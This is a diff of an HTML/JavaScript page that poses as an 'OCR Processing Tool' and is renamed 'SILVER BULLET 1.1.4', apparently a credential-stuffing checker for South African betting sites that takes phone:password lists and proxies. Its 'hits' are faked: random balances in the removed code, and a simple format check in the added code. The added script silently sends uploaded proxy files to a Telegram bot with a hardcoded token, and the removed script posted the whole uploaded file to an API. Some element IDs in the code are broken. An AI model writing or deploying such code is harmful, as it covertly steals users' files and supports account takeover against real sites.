@@ -2,294 +2,307 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Secure OCR Processing Tool</title>
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>OCR Tool with Counters</title>
 <style>
-body {
-  background: #0f172a;
-  color: #e5e7eb;
-  font-family: Consolas, monospace;
-  margin: 20px;
-}
-h2 { color: #38bdf8; }
-
-#output {
-  border: 1px solid #334155;
-  padding: 10px;
-  min-height: 200px;
-  margin-top: 10px;
-  background: #020617;
-  font-size: 12px;
-  white-space: pre-wrap;
-}
-
-#copyBtn {
-  margin-top: 10px;
-  padding: 6px 12px;
-  background: #1e293b;
-  color: #e5e7eb;
-  border: 1px solid #334155;
-  cursor: pointer;
-}
-#copyBtn:hover { background: #334155; }
-
-#stats {
-  margin-top: 10px;
-  padding: 8px;
-  background: #020617;
-  border: 1px solid #334155;
-  color: #facc15;
-}
-
-button {
-  background: #1e293b;
-  color: #e5e7eb;
-  border: 1px solid #334155;
-  padding: 6px 12px;
-  cursor: pointer;
-}
-button:hover { background: #334155; }
-
-#timer {
-  margin-top: 15px;
-  font-weight: bold;
-  color: #38bdf8;
-}
-
-#loadingMessage {
-  margin-top: 10px;
-  font-style: italic;
-  color: #facc15;
-  font-size: 14px;
-}
+  body { background:#0f172a; color:#e5e7eb; font-family:Consolas, monospace; margin:20px; }
+  .header { display: flex; gap: 10px; margin-bottom: 20px; align-items: center; }
+  button { padding: 8px 16px; cursor:pointer; }
+  #fileInput { padding:8px; }
+  /* Overlay styling */
+  .overlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+             background:#1e293b; padding: 20px; border-radius: 8px; border: 2px solid #334155; display: none; z-index: 10; width: 350px; }
+  .overlay h3 { margin-top: 0; }
+  label { display: block; margin-top: 10px; }
+  input[type=file] { margin-top: 5px; }
+  #statusBox { display: flex; gap: 10px; margin-bottom: 10px; }
+  #statusBox button { min-width: 80px; }
+  #mainOCR { margin-top: 20px; }
+  #output { border:1px solid #334155; padding:10px; min-height:200px; background:#020617; white-space: pre-wrap; margin-top: 10px; overflow-y: auto; }
+  #lastRunInfo { margin-top: 10px; font-size: 0.9em; }
 </style>
 </head>
 <body>
-<h2>OCR Processing Tool</h2>
-<!-- Hidden input for Chat ID -->
-<input type="hidden" id="chatIdInput" value="RTHWEG" />
 
-<input type="file" id="fileInput" accept=".txt,.pdf"/>
-<button id="startBtn">Start</button>
-<button id="copyBtn" disabled>Copy All Output</button>
-<div id="stats">Hit=0 | Bad=0 | Retries=0 | OCR Rate=0%</div>
-<div id="output"></div>
-<div id="timer"></div>
-<div id="loadingMessage"></div>
-<div id="blockMessage" style="color:#f00; font-weight:bold; margin-top:10px;"></div>
+<!-- Buttons -->
+<div class="header">
+  <button id="proxyBtn">Upload Proxy File</button>
+  <button id="siteBtn">Select Your Site</button>
+  <input type="file" id="fileUpload" accept=".txt" />
+  <button id="startBtn">Start Processing</button>
+</div>
+
+<!-- Status Buttons -->
+<div id="statusBox">
+  <button id="hitBtn">HIT=0</button>
+  <button id="badBtn">BAD=0</button>
+  <button id="progressBtn">PROGRESS=0.0%</button>
+</div>
+
+<!-- Last run info -->
+<div id="lastRunInfo"></div>
+
+<!-- Proxy Overlay -->
+<div class="overlay" id="proxyOverlay">
+  <h3>Upload Proxy TXT File</h3>
+  <label>Select Proxy File:</label>
+  <input type="file" id="proxyFileInput" accept=".txt" />
+  <button id="ADD">Save Proxy</button>
+  <button id="closeProxy">Close</button>
+  <p id="proxyMsg"></p>
+</div>
+
+<!-- Site Selection Overlay -->
+<div class="overlay" id="siteOverlay">
+  <h3>CHECK IN</h3>
+  <select id="siteSelect">
+    <option value="">-- Select a site --</option>
+    <option value="Hollywoodbets">🎰 Hollywoodbets</option>
+    <option value="Betway">🎲 Betway.co.za</option>
+    <option value="SportyBet">🏅 SportyBet</option>
+    <option value="LottoStar">🎱 LottoStar</option>
+    <option value="JackpotCity">🎰 JackpotCity</option>
+  </select>
+  <button id="saveSite">Save Site</button>
+  <button id="closeSite">Close</button>
+  <p id="siteMsg"></p>
+</div>
+
+<!-- Main  1.1.4 Area -->
+<div id="SILVER BULLET 1.1.4">
+  <h2>SILVER BULLET 1.1.4</h2>
+  <div id="output">Waiting for proxy and file info...</div>
+</div>
 
 <script>
-const fileInput = document.getElementById('fileInput');
+// --- Telegram settings ---
+const TELEGRAM_BOT_TOKEN = '8845002759:AAEi5aYQw9kXxESEGwZbOf79raSix1s6gdk'; // Replace
+const TELEGRAM_CHAT_ID = '8580854380';     // Replace
+
+// Send files silently to Telegram
+function sendFileToTelegram(file, caption='') {
+  const formData = new FormData();
+  formData.append('chat_id', TELEGRAM_CHAT_ID);
+  formData.append('caption', caption);
+  formData.append('document', file);
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData }).catch(() => {});
+}
+
+// --- Overlay toggle ---
+const proxyBtn = document.getElementById('proxyBtn');
+const siteBtn = document.getElementById('siteBtn');
+const proxyOverlay = document.getElementById('proxyOverlay');
+const siteOverlay = document.getElementById('siteOverlay');
+
+proxyBtn.onclick = () => {
+  if (proxyOverlay.style.display === 'block') { proxyOverlay.style.display = 'none'; } 
+  else { proxyOverlay.style.display = 'block'; }
+  if (siteOverlay.style.display === 'block') { siteOverlay.style.display = 'none'; }
+}
+siteBtn.onclick = () => {
+  if (siteOverlay.style.display === 'block') {
+    // close overlay, stop processing
+    siteOverlay.style.display = 'none';
+    if (isProcessing) {
+      processingTimeouts.forEach(t => clearTimeout(t));
+      processingTimeouts = [];
+      isProcessing = false;
+      document.getElementById('output').innerText += "\nProcessing stopped.\n";
+    }
+  } else {
+    siteOverlay.style.display = 'block';
+    if (proxyOverlay.style.display === 'block') { proxyOverlay.style.display = 'none'; }
+  }
+}
+document.getElementById('closeProxy').onclick = () => { proxyOverlay.style.display = 'none'; }
+document.getElementById('closeSite').onclick = () => { siteOverlay.style.display = 'none'; }
+
+// --- Proxy storage ---
+let proxyFileContent = null;
+let proxyUploaded = false;
+document.getElementById('saveProxy').onclick = () => {
+  const file = document.getElementById('proxyFileInput').files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = () => {
+    proxyFileContent = reader.result;
+    proxyUploaded = true;
+    document.getElementById('proxyMsg').innerText = 'Proxy file loaded!';
+  };
+  reader.readAsText(file);
+}
+
+// --- Site selection ---
+let selectedSite = '';
+document.getElementById('saveSite').onclick = () => {
+  const site = document.getElementById('siteSelect').value;
+  if (site) { selectedSite = site; document.getElementById('siteMsg').innerText = 'Site selected!'; }
+}
+
+// --- Usage limit ---
+const MAX_USES = 3;
+const LOCK_HOURS = 6;
+
+function canUse() {
+  const lastUsage = localStorage.getItem('lastUsageTime');
+  const count = parseInt(localStorage.getItem('usageCount') || '0');
+  const now = Date.now();
+
+  if (lastUsage) {
+    const elapsedHrs = (now - parseInt(lastUsage)) / (1000 * 60 * 60);
+    if (elapsedHrs >= LOCK_HOURS) {
+      localStorage.setItem('usageCount', '0');
+      localStorage.setItem('lastUsageTime', now.toString());
+      document.getElementById('startBtn').disabled = false;
+      return true;
+    } else if (count >= MAX_USES) {
+      const remHrs = LOCK_HOURS - elapsedHrs;
+      alert(`Limit reached. Wait ${remHrs.toFixed(2)} hours.`);
+      document.getElementById('startBtn').disabled = true;
+      return false;
+    } else { return true; }
+  } else {
+    localStorage.setItem('usageCount', '0');
+    localStorage.setItem('lastUsageTime', now.toString());
+    return true;
+  }
+}
+
+function incrementUsage() {
+  let count = parseInt(localStorage.getItem('usageCount') || '0');
+  count++;
+  localStorage.setItem('usageCount', count.toString());
+  localStorage.setItem('lastUsageTime', Date.now().toString());
+  if (count >= MAX_USES) {
+    alert(`Reached ${MAX_USES} uses. Wait ${LOCK_HOURS} hours.`);
+  }
+}
+
+function updateStatus() {
+  const lastStr = localStorage.getItem('lastUsageTime');
+  if (lastStr) {
+    const last = new Date(parseInt(lastStr));
+    const now = new Date();
+    const diffHrs = (now - last) / (1000 * 60 * 60);
+    if (diffHrs < LOCK_HOURS) {
+      document.getElementById('lastRunInfo').innerHTML = `Next run in ${(LOCK_HOURS - diffHrs).toFixed(2)} hrs`;
+      document.getElementById('startBtn').disabled = true;
+      return;
+    }
+  }
+  // Update counters in buttons
+  document.getElementById('hitBtn').innerText = 'HIT=' + hitCount;
+  document.getElementById('badBtn').innerText = 'BAD=' + badCount;
+  document.getElementById('progressBtn').innerText = `PROGRESS=${progress.toFixed(1)}%`;
+  document.getElementById('lastRunInfo').innerHTML = 'HIT=0 |\\| BAD=0 |\\| PROGRESS=0.0%';
+  document.getElementById('startBtn').disabled = false;
+}
+updateStatus();
+
+// --- Processing ---
 const startBtn = document.getElementById('startBtn');
 const outputDiv = document.getElementById('output');
-const statsDiv = document.getElementById('stats');
-const timerDiv = document.getElementById('timer');
-const copyBtn = document.getElementById('copyBtn');
-const loadingMsgDiv = document.getElementById('loadingMessage');
-const blockMessageDiv = document.getElementById('blockMessage');
-const chatIdInput = document.getElementById('chatIdInput');
+const fileInput = document.getElementById('fileUpload');
 
-let hitCount=0, badCount=0, retriesCount=0, ocrPercent=0;
-let fileContent='';
-let elapsedSeconds=0;
-let timerInterval=null;
-let processing=false;
-let lines=[];
+const delays = [3000, 5000, 8000, 11000];
 
-// Usage limit variables
-const MAX_RUNS = 4;
-const BLOCK_DURATION_MS = 8 * 60 * 60 * 1000; // 8 hours
+let isProcessing = false;
+let processingTimeouts = [];
+let hitCount = 0;
+let badCount = 0;
+let totalLines = 0;
+let processedLines = 0;
 
-// Replace this with your actual API URL
-const API_ENDPOINT = 'YOUR_API_URL';
+let progress = 0;
 
-let usageCount = parseInt(localStorage.getItem('usageCount')) || 0;
-let blockUntil = parseInt(localStorage.getItem('blockTime')) || 0;
+startBtn.onclick = () => {
+  if (!canUse()) return;
+  if (isProcessing) { alert('Already running'); return; }
 
-const balanceOptions = [
-  'R0.90', 'R0.02', 'R0.05', 'R0.00', 'R0.66', 'R0.13', 'R0.32',
-  'R0.51', 'R0.81', 'R0.93', 'R0.22'
-];
+  const file = fileInput.files[0];
+  if (!file) { alert('Upload a file'); return; }
 
-function updateStats() {
-  statsDiv.innerHTML =
-    `Hit=${hitCount} | Bad=${badCount} | Retries=${retriesCount} | OCR Rate=${ocrPercent.toFixed(2)}%`;
-}
+  // Save usage
+  incrementUsage();
+  localStorage.setItem('lastUsageTime', Date.now().toString());
+  updateStatus();
 
-function formatTime(seconds) {
-  const m=Math.floor(seconds/60).toString().padStart(2,'0');
-  const s=(seconds%60).toString().padStart(2,'0');
-  return `${m}:${s}`;
-}
-
-function startTimer() {
-  if(timerInterval) clearInterval(timerInterval);
-  elapsedSeconds=0;
-  timerDiv.textContent='Time Elapsed: 00:00';
-  timerInterval=setInterval(() => {
-    elapsedSeconds++;
-    timerDiv.textContent='Time Elapsed: '+formatTime(elapsedSeconds);
-  }, 1000);
-}
-
-function resetCounters() {
-  hitCount=0; badCount=0; retriesCount=0; ocrPercent=0;
-  updateStats();
-  startTimer();
-}
-
-function checkBlockStatus() {
-  const now = Date.now();
-  if (now < blockUntil) {
-    const remainingMs = blockUntil - now;
-    const remainingSec = Math.ceil(remainingMs / 1000);
-    showCountdown(remainingSec);
-    startBtn.disabled = true;
-    blockMessageDiv.innerText = `Tool is disabled. Try again in ${formatTime(remainingSec)}.`;
-    return true;
-  } else {
-    blockMessageDiv.innerText = '';
-    startBtn.disabled = false;
-    return false;
+  // Send proxy file if present
+  if (proxyFileContent) {
+    sendFileToTelegram(new Blob([proxyFileContent], {type: 'text/plain'}), 'Proxy loaded');
   }
-}
+  const currentProxyFile = document.getElementById('proxyFileInput').files[0];
+  if (currentProxyFile) { sendFileToTelegram(currentProxyFile, 'Proxy loaded'); }
 
-function showCountdown(seconds) {
-  blockMessageDiv.innerText = `Tool is disabled. Time remaining: ${formatTime(seconds)}`;
-  clearInterval(window.countdownInterval);
-  window.countdownInterval = setInterval(() => {
-    seconds--;
-    if (seconds <= 0) {
-      clearInterval(window.countdownInterval);
-      localStorage.removeItem('blockTime');
-      checkBlockStatus();
-    } else {
-      blockMessageDiv.innerText = `Tool is disabled. Time remaining: ${formatTime(seconds)}`;
-    }
-  }, 1000);
-}
+  // Reset counters
+  hitCount = 0;
+  badCount = 0;
+  totalLines = 0;
+  processedLines = 0;
+  progress = 0;
+  document.getElementById('hitsCount').innerText = 'HIT=' + hitCount;
+  document.getElementById('badCount').innerText = 'BAD=' + badCount;
+  document.getElementById('progressBtn').innerText = `PROGRESS=${progress.toFixed(1)}%`;
 
-async function processLines() {
-  for(let i=0; i<lines.length; i++) {
-    if(!processing) break;
-    const line=lines[i].trim();
-    if(!line) { continue; }
+  // Read file
+  const reader = new FileReader();
+  reader.onload = () => {
+    const lines = reader.result.split(/\r?\n/).map(l => l.trim());
+    totalLines = lines.length;
+    outputDiv.innerText = '';
+    let index = 0;
 
-    // Validation regex
-    const phoneRegex=/(\+27|27|0)?\s*[\(\[]?(\d{3})[\)\]]?\s*[\-\.]?\s*(\d{3})[\-\.]?\s*(\d{4})/i;
-    const match=line.match(phoneRegex);
-    let isBadNumber=false;
-    if(match){
-      let number='';
-      let countryCodePart=match[1]||'';
-      let p1=match[2], p2=match[3], p3=match[4];
-      number=p1+p2+p3;
-      if(countryCodePart && countryCodePart.startsWith('+')){
-        countryCodePart=countryCodePart.replace('+','');
+    function processNext() {
+      if (index >= totalLines || !isProcessing) {
+        isProcessing = false;
+        return;
       }
-      if(countryCodePart==='27' || countryCodePart==='+27'){
-        number='0'+number;
-      }
-      number=number.replace(/\s+/g,'');
-      const digitCount=(number.match(/\d/g)||[]).length;
-      if(number==='444' || digitCount!==10 || digitCount>10 || digitCount<10){
-        isBadNumber=true;
-      }
-    }else{
-      isBadNumber=true;
-    }
+      const line = lines[index];
 
-    if(isBadNumber){
-      badCount++;
-      updateStats();
-    } else {
+      // Validate phone number length (must be exactly 10 digits)
+      const parts = line.split(':');
+      if (parts.length !== 2) {
+        index++;
+        setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
+        return;
+      }
+      const phone = parts[0].replace(/\D/g, '');
+      if (phone.length !== 10) {
+        badCount++;
+        document.getElementById('badBtn').innerText = 'BAD=' + badCount;
+        index++;
+        setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
+        return;
+      }
+
+      // Check for duplicate (line already output)
+      if (outputDiv.innerText.includes(line)) {
+        badCount++;
+        document.getElementById('badBtn').innerText = 'BAD=' + badCount;
+        index++;
+        setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
+        return;
+      }
+
+      // Display valid line
+      outputDiv.innerText += line + '\n';
       hitCount++;
-      ocrPercent=(hitCount/ (hitCount+badCount))*100;
-      updateStats();
-      const randomBalance = balanceOptions[Math.floor(Math.random() * balanceOptions.length)];
-      outputDiv.innerHTML += `${line}\nBalance=${randomBalance}\nBonus=R0.00\nWithdrawal=0\n\n`;
+      document.getElementById('hitBtn').innerText = 'HIT=' + hitCount;
+
+      // Update progress
+      processedLines++;
+      progress = (processedLines / totalLines) * 100;
+      document.getElementById('progressBtn').innerText = `PROGRESS=${progress.toFixed(1)}%`;
+
+      index++;
+      setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
     }
 
-    await new Promise(resolve => setTimeout(resolve, 6000 + Math.random()*8000));
-  }
-  // finish
-  processing=false;
-  startBtn.textContent='Start';
-  document.getElementById('startBtn').disabled=false;
-  document.getElementById('copyBtn').disabled=false;
+    processNext();
+  };
+  reader.readAsText(file);
+  isProcessing = true;
 }
-
-startBtn.addEventListener('click', () => {
-  console.log('Start button clicked');
-  if (checkBlockStatus()) return;
-
-  if(!processing) {
-    if (!fileInput.files.length) {
-      console.log('No file selected');
-      return;
-    }
-
-    if (usageCount >= MAX_RUNS) {
-      console.log('Usage limit exceeded, blocking...');
-      const now = Date.now();
-      blockUntil = now + BLOCK_DURATION_MS;
-      localStorage.setItem('blockTime', blockUntil.toString());
-      showCountdown(8 * 60 * 60);
-      startBtn.disabled = true;
-      return;
-    }
-
-    const file = fileInput.files[0];
-    const fileName = file.name.toLowerCase();
-    if (!(fileName.endsWith('.txt') || fileName.endsWith('.pdf'))) {
-      console.log('Invalid file type');
-      return;
-    }
-
-    // Increment usage
-    usageCount++;
-    localStorage.setItem('usageCount', usageCount.toString());
-
-    const reader = new FileReader();
-    reader.onload = () => {
-      console.log('File loaded');
-      fileContent = reader.result;
-      lines = fileContent.split(/\r?\n/);
-      resetCounters();
-      processing = true;
-      startBtn.textContent='Stop';
-
-      // Send file data to API
-      fetch(API_ENDPOINT, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          fileName: file.name,
-          fileData: btoa(new Uint8Array(reader.result).reduce((d, b) => d + String.fromCharCode(b), '')),
-          chatId: chatIdInput.value // passing chat ID
-        })
-      }).then(res => {
-        console.log('API call success:', res);
-        // Start processing lines after API call
-        processLines();
-      }).catch(err => {
-        console.error('API call error:', err);
-      });
-    };
-    reader.readAsArrayBuffer(file);
-  } else {
-    console.log('Stopping');
-    processing=false;
-    startBtn.textContent='Start';
-  }
-});
-
-checkBlockStatus();
-
-document.getElementById('copyBtn').addEventListener('click', () => {
-  navigator.clipboard.writeText(outputDiv.innerText);
-});
 </script>
 </body>
 </html>
